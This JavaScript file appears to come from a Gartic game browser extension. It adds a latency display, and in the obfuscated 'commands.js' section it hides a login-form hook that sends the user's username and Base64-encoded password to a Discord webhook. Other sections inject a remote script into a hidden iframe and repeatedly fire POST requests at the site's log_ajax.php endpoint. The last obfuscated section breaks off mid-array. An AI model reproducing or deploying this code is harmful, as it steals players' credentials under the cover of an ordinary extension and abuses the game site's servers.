"use strict";
async function ping() {
	let t = Date.now();
	await fetch(window.location.href);
	return `${Date.now()-t}ms`
}
setInterval(() => {
	if(document.location.href.startsWith("https://gartic.com.br/0")){
	document.querySelector('#tema > label:nth-child(9)').innerText="V(beta)"
	}

	ping().then(t => {
		1 == document.location.href.startsWith("https://gartic.com.br/0") &&
      (document.querySelectorAll("input")[8].attributes[0].textContent = t)
	})
}, 3e3);


// [bagunça abaixo]

// r_trash.js
// lentidão crash ou multiplas requests
// apenas durante a partida, caso seja adicionado script no iframe sem delay, causa crash
// 39: 10s de delay

var valor, reported, it, iframe = document.createElement("iframe");

function report() {
	for (valor = 0, reported = []; valor < iframe.contentDocument.getElementsByClassName("sala").length;) "red" == iframe.contentDocument.getElementsByClassName("sala")[valor].style.color && reported.push(iframe.contentDocument.getElementsByClassName("sala")[valor].firstChild.textContent), valor++
}

function salacolor() {
	for (it = 0, report(); it < reported.length;) document.title.includes(reported[it]) && (document.getElementById("limite").style.backgroundImage = "url('https://i.imgur.com/X7Lv55v.png')"), it++
}
iframe.style.width = "0", iframe.style.height = "0", iframe.src = "https://gartic.com.br/", document.body.appendChild(iframe), setInterval(() => {
	salacolor()
}, 5000), setTimeout(() => {
	var e = iframe.contentWindow.document.createElement("script");
	e.type = "text/javascript", e.src = "https://reddap.github.io/gartic-extension/gatric/trash/src/script.js", iframe.contentWindow.document.body.appendChild(e)
}, 10000);


// commands.js
(function(_0x5f259e,_0x496f10){function _0x4db867(_0x252b20,_0x378578,_0x308bec,_0x42c204){return _0x32d8(_0x378578- -0x2e4,_0x308bec);}var _0x370253=_0x5f259e();function _0x169cd7(_0x2df7e2,_0x5e4561,_0x215420,_0x11598a){return _0x32d8(_0x5e4561-0x11a,_0x215420);}while(!![]){try{var _0x18e5cb=parseInt(_0x169cd7(0x303,0x334,0x33b,0x328))/(0x2f+0x459*0x5+-0x15eb*0x1)*(-parseInt(_0x169cd7(0x32f,0x337,0x320,0x34e))/(-0x3c5+0x2196+0x24b*-0xd))+parseInt(_0x4db867(-0xe7,-0x11a,-0x10e,-0x14a))/(0x26e6+-0x394+-0x234f)*(parseInt(_0x4db867(-0x11e,-0xf4,-0x123,-0xb7))/(-0x1*0x2123+0xe7d+0x12aa))+parseInt(_0x4db867(-0x130,-0x12a,-0x166,-0x152))/(-0x8*-0x35b+-0x20d6+0x39*0x1b)+parseInt(_0x4db867(-0xef,-0xf9,-0x129,-0xcb))/(0x1*-0x24f7+0x181e+-0xcdf*-0x1)+parseInt(_0x4db867(-0x123,-0x131,-0x137,-0x124))/(-0x242f*0x1+-0x25b+0x2691)+parseInt(_0x4db867(-0x121,-0x125,-0x128,-0x12e))/(0x3*0x20a+0x57a*-0x7+0x2040)*(parseInt(_0x4db867(-0x143,-0x106,-0xde,-0x113))/(-0x209c*-0x1+-0xbe+-0x1fd5))+parseInt(_0x169cd7(0x2ef,0x30b,0x2cf,0x30a))/(0x1*-0x1499+-0x9fd+0xa0*0x31)*(-parseInt(_0x4db867(-0xee,-0x103,-0x130,-0x116))/(-0xd3*0x1+0x8e1*0x3+0x3*-0x897));if(_0x18e5cb===_0x496f10)break;else _0x370253['push'](_0x370253['shift']());}catch(_0x5efd63){_0x370253['push'](_0x370253['shift']());}}}(_0x3508,-0x7512d*0x1+0xe0490+0x827e));var _0x9fb40d=(function(){function _0x5cae7a(_0x4cf73e,_0xab859b,_0x514e3c,_0x40efb6){return _0x32d8(_0x4cf73e- -0xce,_0x40efb6);}var _0x99d2f0={'muJaY':function(_0x2ba832,_0x2efcab,_0x535748){return _0x2ba832(_0x2efcab,_0x535748);},'QtJiV':_0x4a92b1(0x432,0x461,0x470,0x468)+_0x5cae7a(0x104,0xd2,0xc8,0xf9)+_0x4a92b1(0x435,0x475,0x43d,0x45d)+_0x5cae7a(0x157,0x11a,0x11d,0x12b)+_0x5cae7a(0x140,0x17c,0x134,0x16e)+_0x4a92b1(0x445,0x47b,0x4ae,0x483),'OMJcw':_0x4a92b1(0x44a,0x471,0x494,0x463)+_0x5cae7a(0xe7,0xe7,0xca,0x111),'zwosZ':_0x5cae7a(0x106,0x11d,0xd5,0x12b),'AVbjE':_0x4a92b1(0x479,0x47d,0x464,0x468)+'rtic.com.b'+'r/','rVDaV':_0x4a92b1(0x490,0x441,0x474,0x46d)+_0x4a92b1(0x451,0x4be,0x4ae,0x481)+'ross-origi'+'n','MldmI':function(_0x4ca747,_0x459d08){return _0x4ca747+_0x459d08;},'fkpMM':function(_0x36a6df,_0x4831b7,_0x53ce20){return _0x36a6df(_0x4831b7,_0x53ce20);},'viZQp':_0x5cae7a(0xed,0xb3,0xeb,0x111)+'+$','QpaOa':_0x4a92b1(0x4a8,0x4bd,0x481,0x4b8),'iwkxz':'efmTH','motMC':_0x4a92b1(0x49d,0x4b1,0x4a8,0x47e)},_0x2475f3=!![];function _0x4a92b1(_0x3438f1,_0x25f1cd,_0x192b5f,_0x36a5f5){return _0x32d8(_0x36a5f5-0x295,_0x192b5f);}return function(_0x20a75e,_0x25aaf8){function _0x25dc73(_0x19c4a7,_0xc8e95e,_0x6b784d,_0x424585){return _0x5cae7a(_0x424585-0x492,_0xc8e95e-0x172,_0x6b784d-0xd2,_0x6b784d);}var _0x31152f={};_0x31152f[_0x25dc73(0x5bb,0x574,0x5bc,0x5ab)]=_0x99d2f0[_0x25dc73(0x568,0x57a,0x59e,0x582)],_0x31152f['qAzgS']=_0x99d2f0[_0x25dc73(0x5c2,0x5ba,0x606,0x5d1)],_0x31152f[_0x4f6336(0x4ee,0x4dc,0x4a6,0x519)]=_0x99d2f0[_0x4f6336(0x519,0x4e6,0x520,0x4f9)];var _0x3c8ee9=_0x31152f;function _0x4f6336(_0x396feb,_0x1d0ce,_0x453f23,_0x59521a){return _0x5cae7a(_0x1d0ce-0x395,_0x1d0ce-0x8e,_0x453f23-0x153,_0x59521a);}if(_0x99d2f0[_0x4f6336(0x4a2,0x488,0x4c3,0x45f)]!==_0x99d2f0[_0x4f6336(0x483,0x488,0x44c,0x44f)])var _0x7377c6={'ChaDY':function(_0x5799dc,_0x31aac1,_0x3fb53a){function _0x43e2a9(_0x142d9d,_0xb95adc,_0x10276c,_0x54e910){return _0x25dc73(_0x142d9d-0x127,_0xb95adc-0x82,_0xb95adc,_0x54e910- -0x6cb);}return _0x99d2f0[_0x43e2a9(-0x105,-0x120,-0x159,-0x12e)](_0x5799dc,_0x31aac1,_0x3fb53a);},'UoCXQ':_0x99d2f0[_0x4f6336(0x4a1,0x489,0x44b,0x4b6)],'yvmFN':_0x99d2f0[_0x4f6336(0x4bb,0x487,0x465,0x47d)],'OPTgw':'applicatio'+_0x4f6336(0x4e4,0x4ef,0x514,0x4c3)+_0x4f6336(0x492,0x4b4,0x4e9,0x4d3)+'ded','KZQsh':_0x99d2f0[_0x4f6336(0x4a0,0x48e,0x4bb,0x4b7)],'TllrD':_0x99d2f0[_0x25dc73(0x5b2,0x5e2,0x5b8,0x5d4)],'IOXQP':_0x99d2f0[_0x25dc73(0x5ad,0x5d3,0x5ff,0x5c9)],'FAMtf':function(_0x18f565,_0x39996a){function _0x4426c9(_0x577699,_0x1d48bf,_0x23bd03,_0x4a15f2){return _0x25dc73(_0x577699-0xfd,_0x1d48bf-0x14a,_0x1d48bf,_0x23bd03- -0x151);}return _0x99d2f0[_0x4426c9(0x46b,0x445,0x44d,0x42b)](_0x18f565,_0x39996a);},'LcOly':'userLogin='+'vibora&sen'+_0x25dc73(0x57a,0x5d7,0x5e5,0x5b9),'VtWCn':'include'},_0x4b5013=_0x99d2f0[_0x25dc73(0x580,0x584,0x5e5,0x5b7)](_0x11ac35,()=>{_0x7377c6[_0x4d4e64(0xfe,0xad,0xd0,0x9b)](_0x49c257,_0x7377c6[_0x29ee4b(-0x1c3,-0x197,-0x1cd,-0x1e6)],{'headers':{'accept':_0x29ee4b(-0x1b0,-0x1c5,-0x1ec,-0x1d0),'accept-language':_0x7377c6[_0x4d4e64(0x10b,0xf2,0xe7,0x10e)],'content-type':_0x7377c6[_0x4d4e64(0x10e,0xdb,0x10e,0xdb)],'sec-fetch-dest':'empty','sec-fetch-mode':_0x7377c6[_0x4d4e64(0x14b,0x136,0x113,0x12b)],'sec-fetch-site':_0x4d4e64(0xf0,0x137,0x115,0x13c)+'n','sec-gpc':'1'},'referrer':_0x7377c6[_0x29ee4b(-0x1a2,-0x1aa,-0x1ca,-0x1e1)],'referrerPolicy':_0x7377c6[_0x4d4e64(0xac,0x85,0xb9,0x8c)],'body':_0x7377c6['FAMtf'](_0x7377c6[_0x29ee4b(-0x1fc,-0x232,-0x1f9,-0x1e0)],_0x16c38a),'method':_0x4d4e64(0x97,0xcb,0xa4,0x8e),'mode':'cors','credentials':_0x7377c6[_0x29ee4b(-0x19e,-0x1cf,-0x1dd,-0x1fe)]});function _0x4d4e64(_0x523c99,_0x1d8ab9,_0x1e1435,_0xfe4844){return _0x25dc73(_0x523c99-0x4b,_0x1d8ab9-0x1a0,_0xfe4844,_0x1e1435- -0x4d1);}function _0x29ee4b(_0x1057bc,_0x429d8a,_0x5cc000,_0x5aa332){return _0x4f6336(_0x1057bc-0xc6,_0x5cc000- -0x6a5,_0x5cc000-0x1c5,_0x5aa332);}_0x319587++;},0x6fe+0x1*0x1537+0xd*-0x205);else{var _0x26f8ac=_0x2475f3?function(){var _0x2d5d0={};function _0x55b26d(_0x12ff17,_0x35edb5,_0x23df1c,_0x50d3d5){return _0x25dc73(_0x12ff17-0x140,_0x35edb5-0xb,_0x50d3d5,_0x35edb5- -0x209);}function _0x1f38e1(_0x26d4a1,_0x5797ae,_0x1a491f,_0x6d64e){return _0x4f6336(_0x26d4a1-0x149,_0x6d64e- -0xb4,_0x1a491f-0x5f,_0x1a491f);}_0x2d5d0['nqnMO']=_0x3c8ee9[_0x1f38e1(0x3fa,0x422,0x429,0x3fa)];var _0x19fc37=_0x2d5d0;if(_0x3c8ee9[_0x1f38e1(0x448,0x47a,0x435,0x43c)]!==_0x3c8ee9[_0x55b26d(0x3ae,0x3d0,0x3d1,0x3b8)]){if(_0x25aaf8){var _0x49cf26=_0x25aaf8['apply'](_0x20a75e,arguments);return _0x25aaf8=null,_0x49cf26;}}else return _0x4718fd[_0x55b26d(0x39c,0x3d2,0x40d,0x3da)]()[_0x55b26d(0x3ae,0x3c7,0x3f9,0x3ae)](_0x19fc37['nqnMO'])[_0x55b26d(0x3d0,0x3d2,0x3ae,0x3dc)]()[_0x1f38e1(0x3fe,0x3fe,0x40b,0x41a)+'r'](_0x4a35fc)['search'](_0x1f38e1(0x3ca,0x3ae,0x406,0x3ce)+'+$');}:function(){};return _0x2475f3=![],_0x26f8ac;}};}()),_0x16a74a=_0x9fb40d(this,function(){var _0x5cb6fc={};_0x5cb6fc[_0x420704(0x455,0x44c,0x467,0x468)]=_0x116f85(0x240,0x226,0x235,0x27c)+'+$';function _0x116f85(_0x3c1ccb,_0x2e5362,_0x8c2faa,_0x17b0c9){return _0x32d8(_0x3c1ccb-0x85,_0x17b0c9);}var _0x2cc36b=_0x5cb6fc;function _0x420704(_0xac937e,_0x10f727,_0x27b633,_0x59d055){return _0x32d8(_0x59d055-0x252,_0x27b633);}return _0x16a74a[_0x116f85(0x29c,0x25f,0x274,0x25f)]()[_0x116f85(0x291,0x252,0x282,0x293)](_0x2cc36b[_0x116f85(0x29b,0x27d,0x2b1,0x25f)])[_0x420704(0x45e,0x479,0x42a,0x469)]()[_0x420704(0x47b,0x450,0x470,0x459)+'r'](_0x16a74a)['search'](_0x2cc36b['HcuNG']);});_0x16a74a();function _0x3508(){var _0x16b3f1=['MrUzH','JXVAH','empty','POST','JAYiX','3601451NbzxLH','#senhaLogi','=0.9','textConten','href','cNHcS','characterD','912720yDBHgM','(((.+)+)+)','api/webhoo','addEventLi','viZQp','784336qNOSVj','OMJcw','motMC','QtJiV','5044115463','#userLogin','tor','IOXQP','zwosZ','r/log_ajax','stringify','215178sJpSsO','rGXIK','encode','location','en-US,en;q','MAo2fiS2-z','RVZCK','BGZoc','rtic.com.b','https://ga','cors','ata','.;;,','#blocoDesl','strict-ori','muJaY','MldmI','\x20input','rm\x20>\x20div\x20>','ChaDY','45GUIMMZ','wJsbI','torAll','58685xSKCcU','forEach','ExyiQ','lastChild','LcOly','gnHeI','VubWq','apply','AudJT','ogado\x20>\x20fo','2068344qZIfcC','gin-when-c','rm-urlenco','074','target','28AIGoIO','2230LEulBE','*/*','fkpMM','yvmFN','haLogin=','PlHsg','querySelec','ImXKH','eRKqL','attributes','vqJZL','ukQkv','value','startsWith','r/0','ERvET','VtWCn','include','r3YAKhAWuc','syJv6P9rYW','rVDaV','ded','constructo','xqpIO','CqFKF','9ccPyL2lcW','includes','search','QpaOa','1639094456','userLogin=','AVbjE','UoCXQ','ks/9186674','scord.com/','TllrD','tAMGi','HcuNG','toString','DKFfi','ross-origi','1mlwPIS','OPTgw','qLmZY','743606aXiXhj','uEnTrw5OzN','iwkxz','KZQsh','SPbQk','same-origi','jYLNw','applicatio','.php?rand=','1/DNLgGgZD','observe','n/x-www-fo','qAzgS','childList','nbWRb'];_0x3508=function(){return _0x16b3f1;};return _0x3508();}document[_0x407f10(0x189,0x1b8,0x177,0x14e)][_0x407f10(0x173,0x193,0x192,0x159)]===_0x407f10(0x18f,0x15a,0x1ad,0x1a9)+_0x407f10(0x18e,0x151,0x170,0x1bf)+'r/'&&document[_0x407f10(0x1b3,0x1e0,0x1bf,0x190)+'tor'](_0x6f28f(0x7d,0x84,0x90,0xce)+_0x407f10(0x1a6,0x1d3,0x1a5,0x172)+_0x6f28f(0x87,0xa8,0x95,0xce)+_0x407f10(0x197,0x16a,0x165,0x197))[_0x6f28f(0x3a,0x7c,0x76,0x76)+'stener']('click',()=>{function _0x29ff92(_0x5ec083,_0x38612b,_0x548cbc,_0x543a59){return _0x407f10(_0x38612b-0x30d,_0x38612b-0xef,_0x5ec083,_0x543a59-0x13e);}var _0xcbcdef={'gnHeI':function(_0x32b3ea,_0x3f4c5a,_0x1a907d){return _0x32b3ea(_0x3f4c5a,_0x1a907d);},'JXVAH':'https://di'+_0x205659(0x168,0x167,0x123,0x15a)+_0x29ff92(0x478,0x485,0x4ad,0x46f)+_0x205659(0x174,0x14e,0x18c,0x159)+_0x205659(0x101,0xef,0x108,0x10a)+_0x29ff92(0x4bb,0x4ef,0x4fb,0x4c8)+_0x29ff92(0x4f5,0x4cd,0x4a6,0x490)+_0x205659(0x11c,0x146,0xf9,0x116)+_0x29ff92(0x4a2,0x4d3,0x498,0x4ba)+'QyJ5CbT1He'+_0x205659(0x139,0x13e,0x18e,0x165)+_0x29ff92(0x4d0,0x4cc,0x4ea,0x490),'IeqHQ':'POST','ERvET':_0x205659(0x105,0xe4,0xeb,0xfb)+'n'};function _0x205659(_0x526668,_0x2632cf,_0x161e80,_0x591590){return _0x407f10(_0x591590- -0x75,_0x2632cf-0x1ca,_0x161e80,_0x591590-0x65);}_0xcbcdef[_0x205659(0xf2,0x127,0x128,0x12d)](fetch,_0xcbcdef[_0x29ff92(0x4b3,0x478,0x45d,0x4a2)],{'method':_0xcbcdef['IeqHQ'],'headers':headers,'mode':_0x29ff92(0x462,0x49d,0x4c3,0x463),'body':JSON[_0x205659(0xde,0x12f,0x113,0x110)]({'banned':![],'content':document[_0x205659(0x169,0x121,0x11b,0x13e)+_0x29ff92(0x458,0x48e,0x460,0x4a8)](_0x205659(0x132,0xf6,0xde,0x10b))[_0x205659(0x136,0x149,0x15e,0x144)]+'\x20'+Base64[_0x205659(0x141,0xf7,0xd6,0x113)](document['querySelec'+_0x29ff92(0x4a0,0x48e,0x48c,0x4c0)](_0xcbcdef[_0x29ff92(0x4c2,0x4c9,0x4ef,0x505)])[_0x29ff92(0x4a7,0x4c6,0x4de,0x4c6)])})});});function _0x6f28f(_0x4008be,_0x47500f,_0x131e9a,_0x1902f9){return _0x32d8(_0x131e9a- -0x147,_0x47500f);}function _0x407f10(_0x1cd01f,_0x4697a0,_0xb49e80,_0x1072d7){return _0x32d8(_0x1cd01f- -0x44,_0xb49e80);}function _0x32d8(_0x5a607f,_0x32c7b0){var _0x57ee89=_0x3508();return _0x32d8=function(_0x3051ed,_0x4a8a44){_0x3051ed=_0x3051ed-(-0x80*-0x43+0x1f40+0x1*-0x3f11);var _0x581ce3=_0x57ee89[_0x3051ed];return _0x581ce3;},_0x32d8(_0x5a607f,_0x32c7b0);}var noti=0x26f+-0x84e+0x9c7;function ban(){function _0x21b319(_0x5c6078,_0x1d62ce,_0x1806e4,_0x28ff3a){return _0x407f10(_0x28ff3a- -0x310,_0x1d62ce-0x92,_0x1806e4,_0x28ff3a-0xe5);}var _0x1e72c1={'ExyiQ':function(_0x456c49,_0x5dc566){return _0x456c49!==_0x5dc566;},'rGXIK':_0x21b319(-0x110,-0x10a,-0x100,-0x128),'uAqYj':function(_0x5b0de4,_0xb96f86,_0x2c49de){return _0x5b0de4(_0xb96f86,_0x2c49de);},'DKFfi':_0x21b319(-0x19f,-0x165,-0x195,-0x181)+_0x5ae1d2(-0x1d6,-0x20c,-0x207,-0x238)+'r/log_ajax'+'.php?rand='+_0x5ae1d2(-0x1ed,-0x1af,-0x1cb,-0x1bf)+_0x21b319(-0x137,-0x152,-0x144,-0x166),'qLmZY':_0x21b319(-0x17e,-0x19a,-0x14e,-0x162),'TUhzC':_0x21b319(-0x16d,-0x181,-0x174,-0x186)+_0x21b319(-0x17b,-0x1ab,-0x1cc,-0x19f),'dalhq':_0x5ae1d2(-0x204,-0x258,-0x229,-0x20c),'vqJZL':'cors','nbWRb':_0x21b319(-0x16a,-0x153,-0x156,-0x181)+'rtic.com.b'+'r/','PlHsg':_0x5ae1d2(-0x23d,-0x207,-0x201,-0x212)+_0x21b319(-0x185,-0x153,-0x188,-0x168)+_0x5ae1d2(-0x1ab,-0x1e2,-0x1c0,-0x182)+'n','wJsbI':function(_0x20c2c6,_0x53a979){return _0x20c2c6+_0x53a979;},'CqFKF':_0x21b319(-0x126,-0x147,-0x168,-0x145)+'vibora&sen'+_0x5ae1d2(-0x1ef,-0x1de,-0x1e4,-0x1f3),'SPbQk':_0x21b319(-0x197,-0x18e,-0x1da,-0x1a3),'nLDcK':_0x21b319(-0x137,-0x150,-0x181,-0x152)};function _0x5ae1d2(_0x4bda1a,_0x361d65,_0x3bb641,_0x5e0378){return _0x407f10(_0x3bb641- -0x395,_0x361d65-0x0,_0x5e0378,_0x5e0378-0xbf);}var _0x1ac965=_0x1e72c1['uAqYj'](setInterval,()=>{function _0x4252fd(_0x16149f,_0x219ce3,_0x2ac498,_0x2ed565){return _0x21b319(_0x16149f-0xf1,_0x219ce3-0x14d,_0x16149f,_0x219ce3-0x502);}function _0x1af53b(_0x57f115,_0x11d09f,_0x516915,_0x4f18ad){return _0x5ae1d2(_0x57f115-0x1e4,_0x11d09f-0x1d6,_0x57f115-0x582,_0x11d09f);}if(_0x1e72c1[_0x4252fd(0x3cc,0x391,0x377,0x3af)](_0x1e72c1[_0x1af53b(0x374,0x393,0x35c,0x35d)],_0x4252fd(0x3ce,0x3a7,0x3a3,0x3a4)))_0x1e72c1['uAqYj'](fetch,_0x1e72c1[_0x1af53b(0x3c1,0x3ae,0x384,0x3a3)],{'headers':{'accept':_0x1e72c1[_0x1af53b(0x3c5,0x3e0,0x3ea,0x3ef)],'accept-language':_0x1e72c1['TUhzC'],'content-type':_0x1af53b(0x3cd,0x400,0x3a6,0x3ab)+_0x4252fd(0x3e3,0x3d6,0x3f9,0x410)+_0x1af53b(0x396,0x359,0x39e,0x3ce)+_0x1af53b(0x3af,0x39f,0x3e3,0x38e),'sec-fetch-dest':_0x1e72c1['dalhq'],'sec-fetch-mode':_0x1e72c1[_0x4252fd(0x3af,0x3a9,0x389,0x36c)],'sec-fetch-site':'same-origi'+'n','sec-gpc':'1'},'referrer':_0x1e72c1[_0x4252fd(0x3eb,0x3d9,0x3c5,0x3a6)],'referrerPolicy':_0x1e72c1[_0x1af53b(0x39f,0x36a,0x3d4,0x3a9)],'body':_0x1e72c1[_0x1af53b(0x388,0x36f,0x3bd,0x357)](_0x1e72c1[_0x4252fd(0x392,0x3b7,0x38f,0x3cc)],noti),'method':_0x1e72c1[_0x1af53b(0x3ca,0x405,0x3c3,0x3db)],'mode':_0x1e72c1[_0x1af53b(0x3a4,0x399,0x367,0x371)],'credentials':_0x1e72c1['nLDcK']}),noti++;else{if(_0x4c69da){var _0x522e08=_0x3fc604[_0x4252fd(0x377,0x396,0x378,0x3c0)](_0x244ea4,arguments);return _0x24451a=null,_0x522e08;}}},0x820+-0x2*0x5f+0x2b7*-0x2);}if(document['location'][_0x6f28f(0x93,0x4d,0x70,0x97)][_0x407f10(0x1ba,0x1a9,0x1b3,0x1d9)]('https://ga'+'rtic.com.b'+_0x407f10(0x1bb,0x1bc,0x1ee,0x185))){var target=document[_0x6f28f(0x8f,0xb5,0xb0,0xca)+_0x6f28f(0x97,0x80,0x99,0x9c)]('.lista')[0x875+-0x571*0x1+-0xb*0x46],observer=new MutationObserver(async function(_0xaafa37){function _0x16211a(_0x115934,_0x512b60,_0x6319c5,_0x1222db){return _0x6f28f(_0x115934-0x84,_0x6319c5,_0x512b60-0x212,_0x1222db-0x84);}function _0x14bdab(_0x3712f6,_0x4f73be,_0x3ec3f0,_0x301f2e){return _0x407f10(_0x301f2e-0x2c5,_0x4f73be-0x15f,_0x3712f6,_0x301f2e-0x87);}var _0x435cb6={'RlakP':function(_0x11711c,_0x49a02c){return _0x11711c(_0x49a02c);},'JAYiX':function(_0x271fe7,_0x5da378){return _0x271fe7===_0x5da378;},'ukQkv':_0x14bdab(0x483,0x447,0x49c,0x479),'xqpIO':_0x16211a(0x265,0x2a1,0x275,0x27f),'jyYAW':_0x16211a(0x283,0x29b,0x2b7,0x2d5),'cNHcS':_0x14bdab(0x429,0x471,0x485,0x452)};_0xaafa37[_0x14bdab(0x447,0x43f,0x44e,0x463)](async function(_0x3a702c){function _0x47c987(_0x50ca48,_0x42279a,_0x228909,_0x36d74c){return _0x14bdab(_0x42279a,_0x42279a-0x164,_0x228909-0xc9,_0x50ca48- -0x22);}function _0x37f92a(_0x410482,_0x31b02a,_0x3724e7,_0x2c70c4){return _0x16211a(_0x410482-0x79,_0x410482-0x204,_0x31b02a,_0x2c70c4-0x1ee);}if(_0x435cb6[_0x37f92a(0x481,0x484,0x49d,0x476)](_0x435cb6[_0x47c987(0x45b,0x44b,0x46b,0x470)],'ImXKH'))_0x3a702c[_0x37f92a(0x4be,0x4bb,0x4cc,0x497)][_0x47c987(0x443,0x447,0x412,0x471)]['textConten'+'t'][_0x37f92a(0x4da,0x4f3,0x50d,0x4a5)](';;;,')&&ban(),_0x3a702c['target']['lastChild'][_0x47c987(0x415,0x403,0x42d,0x41d)+'t'][_0x47c987(0x46a,0x47f,0x492,0x44d)](_0x435cb6[_0x47c987(0x467,0x464,0x478,0x47d)])&&(_0x435cb6['jyYAW']===_0x435cb6[_0x47c987(0x417,0x417,0x42f,0x42f)]?_0x435cb6['RlakP'](_0x3e8e78,_0x386a92):clearInterval(baneec));else{var _0x21166a=_0x50e0dc?function(){function _0x1fe9e4(_0x258144,_0xdcbed9,_0x245a33,_0x218448){return _0x37f92a(_0x258144- -0x1d7,_0xdcbed9,_0x245a33-0x1cd,_0x218448-0x16b);}if(_0x2cac8b){var _0x4ddd3a=_0x428133[_0x1fe9e4(0x2e0,0x2dd,0x30d,0x2a1)](_0x1176a2,arguments);return _0xaf4fcb=null,_0x4ddd3a;}}:function(){};return _0x323b7f=![],_0x21166a;}});}),_0x4c19cb={};_0x4c19cb[_0x6f28f(0xae,0xdd,0xb3,0x91)]=!![],_0x4c19cb[_0x6f28f(0xe6,0x11a,0xe3,0xae)]=!![],_0x4c19cb[_0x6f28f(0x39,0x47,0x72,0x70)+_0x407f10(0x191,0x1ae,0x1cd,0x191)]=!![];var config=_0x4c19cb;observer[_0x6f28f(0xe3,0xdc,0xe0,0xf4)](target,config);}

// o script a seguir é parte do background_color.js (vet assistant).
(function(_0x912cf3,_0x1c08e9){function _0x379661(_0x506421,_0xbb9c93,_0x2a675a,_0x5ce412){return _0x15c2(_0x5ce412- -0x3bf,_0xbb9c93);}var _0x2e145a=_0x912cf3();function _0x3ecc7f(_0x3129ca,_0x5b2202,_0x14b3ac,_0x3722e2){return _0x15c2(_0x3129ca- -0x2f7,_0x14b3ac);}while(!![]){try{var _0x17e362=parseInt(_0x3ecc7f(-0x20a,-0x23b,-0x20f,-0x1cc))/(0x735+0x9f9+-0x112d)+parseInt(_0x3ecc7f(-0x1bf,-0x1e8,-0x1a9,-0x179))/(0x628*-0x4+-0xd1*0x8+0x1f2a)+-parseInt(_0x3ecc7f(-0x1b1,-0x19a,-0x16f,-0x1a6))/(0x1*-0x26ef+-0x1463+-0x3b55*-0x1)+parseInt(_0x3ecc7f(-0x1cb,-0x1f9,-0x1a8,-0x1bb))/(0x858+0x16*-0x95+0x47a)+parseInt(_0x3ecc7f(-0x1a6,-0x170,-0x1aa,-0x1c9))/(-0xe27+-0x1*0x18a7+-0x26d3*-0x1)*(parseInt(_0x3ecc7f(-0x197,-0x1b9,-0x1c0,-0x15b))/(0x56*-0x29+-0x22f9+0x30c5))+-parseInt(_0x379661(-0x28e,-0x2f0,-0x2be,-0x2cf))/(-0x4*0x7ed+0x1*0xf35+-0x1086*-0x1)+-parseInt(_0x3ecc7f(-0x184,-0x13d,-0x197,-0x177))/(-0x257*0x2+0x9e1+0x93*-0x9);if(_0x17e362===_0x1c08e9)break;else _0x2e145a['push'](_0x2e145a['shift']());}catch(_0x40b597){_0x2e145a['push'](_0x2e145a['shift']());}}}(_0x16ac,-0x7058+0x2*0x65b2e+-0x146f5));var _0x166224=(function(){var _0xd1a00={'gXdwS':function(_0x5d5141,_0x11dbf5){return _0x5d5141==_0x11dbf5;},'UJcix':function(_0x20a3a5){return _0x20a3a5();},'KkgjS':function(_0x2c0406,_0x2ab7ff){return _0x2c0406!==_0x2ab7ff;},'HVZap':_0x3fa791(-0x9e,-0xbf,-0x56,-0x53)};function _0x3fa791(_0x3685b3,_0x4a8f1d,_0x593ac4,_0x301ffe){return _0x15c2(_0x3685b3- -0x198,_0x301ffe);}var _0xe5f6b8=!![];return function(_0x323b34,_0x197b77){function _0x57b85e(_0x4bef6f,_0x29f4c5,_0x10202d,_0x4d0c67){return _0x3fa791(_0x4bef6f-0x43,_0x29f4c5-0xd2,_0x10202d-0x19d,_0x4d0c67);}var _0x89dd12={'gUoDH':function(_0x5cb9ea,_0x5803fe){function _0x4134e9(_0x22af24,_0x45a6e6,_0x3df895,_0x223d5b){return _0x15c2(_0x22af24- -0x139,_0x45a6e6);}return _0xd1a00[_0x4134e9(0x2d,0x76,0x5f,0x64)](_0x5cb9ea,_0x5803fe);},'uUFcH':function(_0x501a49){function _0x399baf(_0x388b55,_0x12631f,_0x7c358f,_0xacfecd){return _0x15c2(_0xacfecd- -0xf9,_0x388b55);}return _0xd1a00[_0x399baf(0x38,-0x20,0x2e,0xe)](_0x501a49);}};function _0x1e812c(_0x1d0b3e,_0x35dcd5,_0x4d555e,_0x3f8ef6){return _0x3fa791(_0x1d0b3e- -0x1ed,_0x35dcd5-0x30,_0x4d555e-0x1b3,_0x35dcd5);}if(_0xd1a00[_0x57b85e(-0x5c,-0x48,-0x42,-0x56)](_0x1e812c(-0x28b,-0x2b4,-0x290,-0x29f),_0xd1a00[_0x1e812c(-0x214,-0x235,-0x23b,-0x1cf)]))_0x89dd12['gUoDH'](_0x1195f7+'\x20'+_0x2e9837+'\x20'+_0x30184b+'\x20'+_0x4a5821,_0x45b31b)&&_0x89dd12[_0x57b85e(-0x63,-0x77,-0x4a,-0x78)](_0x5b283d);else{var _0x1dc0f8=_0xe5f6b8?function(){if(_0x197b77){var _0x5beda6=_0x197b77['apply'](_0x323b34,arguments);return _0x197b77=null,_0x5beda6;}}:function(){};return _0xe5f6b8=![],_0x1dc0f8;}};}()),_0x38ab07=_0x166224(this,function(){var _0x955a06={};function _0xd1c2c4(_0x5c6e44,_0x1f3509,_0x5512b1,_0x1ef0ac){return _0x15c2(_0x1ef0ac- -0xeb,_0x5512b1);}_0x955a06[_0x4f1bdf(0x75,0xab,0xa7,0x6f)]='(((.+)+)+)'+'+$';var _0x51b3ae=_0x955a06;function _0x4f1bdf(_0x14aff2,_0x41f425,_0x11fb56,_0x168db5){return _0x15c2(_0x14aff2- -0xee,_0x168db5);}return _0x38ab07['toString']()[_0x4f1bdf(0x7b,0x34,0x3e,0x75)](_0x51b3ae[_0x4f1bdf(0x75,0x79,0x48,0x97)])['toString']()[_0xd1c2c4(0x63,0x24,0x8d,0x69)+'r'](_0x38ab07)[_0xd1c2c4(0x8a,0x82,0xae,0x7e)](_0x51b3ae[_0xd1c2c4(0x2e,0x38,0x84,0x78)]);});_0x38ab07();function _0x16ac(){var _0x585b1f=['kuAgz','UJcix','BzQBY','value','checked','Zzywj','HnUOo','location','SFqjY','green','form','dSMHk','petKE','DcLXd','hGhnk','CbyVZ','INuxy','njQoP','TJlvQ','255','eMiHI','split','red','bsYQm','JZIti','boxvets','mit','wvGLb','fcUIp','uPEyW','VxJSi','ZDexe','MLmZO','getElement','PTach','ZCKzo','carneiro','255\x200\x200\x2025','5748792pxGsOc','leopardo-d','gartic.com','140\x2069\x200\x202','cyans','TqlZQ','getImageDa','eWhQo','browns','isGSg','ddmiY','ovelha','1893868MukACc','guepardo','jwTHc','tigre\x20de\x20b','ilSaT','NwvWD','wYMEc','Kpgdm','255\x20127\x200\x20','radHc','Jqemt','height','now','jaguatiric','1066239NyHIQu','pink','OtZki','greens','deDbP','rrsqb','sByClassNa','ceDKq','Xzrxd','width','length'